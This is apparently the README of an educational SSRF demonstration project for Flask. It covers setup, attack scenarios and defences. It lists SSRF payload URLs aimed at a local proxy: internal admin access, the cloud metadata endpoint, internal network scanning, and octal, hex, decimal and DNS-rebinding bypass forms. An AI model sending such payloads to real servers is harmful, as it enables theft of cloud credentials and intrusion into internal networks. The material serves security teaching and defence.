# Flask SSRF Vulnerability Simulation

This project demonstrates a critical web security vulnerability, **Server-Side Request Forgery (SSRF)**, within simulated Flask applications. The goal is to follow the "Build It, Break It, Fix It" methodology to understand how SSRF vulnerabilities work, how they can be exploited, and how to defend against them.

## 📜 Project Overview

The application has multiple components:

1. **`vulnerable_app.py`**: A vulnerable proxy server that accepts URLs without validation
2. **`localhashboard.py`**: An internal admin dashboard running on port 80
3. **`exploit_ssrf.py`**: An automated SSRF testing tool
4. **`secure_app.py`**: Security module with SSRF protection decorators

The attack scenario involves exploiting the vulnerable proxy to access internal resources, cloud metadata services, and internal network services that should not be publicly accessible.

* **Vulnerability:** Server-Side Request Forgery (SSRF)
* **Impact:** Internal Network Scanning, Cloud Metadata Access, Internal Service Compromise

---

## ⚙️ Setup & Installation

1. **Clone the repository or download the project files.**
2. **Create and activate a Python virtual environment:**
    ```bash
    # Create the environment
    python -m venv venv

    # Activate it (Windows)
    .\venv\Scripts\activate

    # Activate it (macOS/Linux)
    source venv/bin/activate
    ```
3. **Install the required dependencies:**
    ```bash
    pip install flask requests
    ```

---

## 🚀 How to Run the Demonstration

This demonstration simulates a realistic SSRF attack scenario with multiple vulnerable endpoints and protection mechanisms.

### Part 1: Break It (Exploiting SSRF Vulnerabilities)

**Step 1: Start the Vulnerable Proxy Server**
```bash
python app.py
```
This starts a vulnerable proxy on `http://localhost:5000` that accepts any URL without validation.

**Step 2: Start the Internal Dashboard (requires admin privileges)**
```bash
# On Linux/Mac (requires sudo for port 80)
sudo python localhashboard.py

# On Windows (run as Administrator)
python localhashboard.py
```
This starts an internal admin dashboard on `http://localhost:80` that should not be accessible from outside.

**Step 3: Run the SSRF Attack**
```bash
python exploit_ssrf.py
```
The automated tester will attempt various SSRF attacks including:
- Accessing internal services via the proxy
- Cloud metadata service exploitation
- Internal network scanning
- Bypass technique attempts

---

## 🎯 Attack Scenarios Demonstrated

### 1. Internal Service Access
```http
http://localhost:5000/get?url=http://localhost:80/admin
http://localhost:5000/get?url=http://127.0.0.1:80/api/data
```

### 2. Cloud Metadata Exploitation
```http
http://localhost:5000/get?url=http://169.254.169.254/latest/meta-data/
http://localhost:5000/get?url=http://metadata.google.internal/
```

### 3. Internal Network Scanning
```http
http://localhost:5000/get?url=http://192.168.1.1/
http://localhost:5000/get?url=http://10.0.0.1:8080/
```

### 4. Bypass Techniques
```http
http://localhost:5000/get?url=http://0177.0.0.1:80/        # Octal
http://localhost:5000/get?url=http://0x7f.0.0.1:80/        # Hexadecimal  
http://localhost:5000/get?url=http://2130706433:80/        # Decimal
http://localhost:5000/get?url=http://127.0.0.1.nip.io:80/  # DNS rebinding
```

---

## 🛡️ SSRF Protection Mechanisms

### 1. URL Validation & Allow Lists
```python
ALLOWED_DOMAINS = {'api.trusted.com', 'cdn.example.com'}
BLOCKED_PORTS = {22, 25, 443, 3306, 5432}
```

### 2. Private IP Detection
- Blocks RFC 1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Blocks loopback addresses (127.0.0.0/8, ::1)
- Blocks link-local addresses (169.254.0.0/16)

### 3. Scheme Validation
- Only allows HTTP/HTTPS protocols
- Blocks file://, gopher://, dict://, and other dangerous schemes

### 4. DNS Rebinding Protection
- Validates DNS resolutions don't point to internal IPs
- Implements DNS caching and timeout controls

---

## 📊 Test Results & Impact Assessment

### Vulnerability Impact:
- **Critical**: Access to internal admin interfaces
- **High**: Cloud metadata credential theft  
- **Medium**: Internal network reconnaissance
- **Low**: Service enumeration

### Successful Attack Vectors:
- ✅ Internal dashboard access via proxy
- ✅ API endpoint enumeration
- ✅ Local service discovery
- ⚠️ Cloud metadata (environment dependent)

---

## 🔧 Security Recommendations

### 1. Input Validation
- Use allow lists instead of deny lists
- Validate URL schemes and destinations
- Implement proper URL parsing and normalization

### 2. Network Controls
- Implement outbound firewall rules
- Use network segmentation
- Restrict internal service access

### 3. Application Hardening
- Use the `ssrf_protection` decorator on all external URL inputs
- Implement request timeouts and size limits
- Add comprehensive logging and monitoring

### 4. Cloud Protections
- Use instance metadata service v2 (IMDSv2) where available
- Implement service mesh with proper egress controls
- Use cloud-native security groups and NACLs

---

## 📁 Project Structure

```
ssrf-demo/
├── vulnerable_app.py        # Vulnerable proxy application
├── localhashboard.py        # Internal admin dashboard
├── exploit_ssrf.py          # SSRF testing tool
├── secure_app.py            # SSRF protection library
├── requirements.txt         # Python dependencies
└── README.md                # This file
```

---

## ⚠️ Legal & Ethical Notice

This project is for **educational and authorized testing purposes only**. Unauthorized testing of systems you don't own is illegal. Always ensure you have explicit permission before conducting any security testing.

---

## 🎓 Learning Objectives

After completing this demonstration, you should understand:

- How SSRF vulnerabilities occur in web applications
- Common SSRF attack vectors and bypass techniques
- The impact of SSRF on cloud and on-premise environments
- How to implement comprehensive SSRF protection
- Defense-in-depth strategies against SSRF attacks

**Remember: The best defense against SSRF is a combination of proper input validation, network segmentation, and the principle of least privilege.**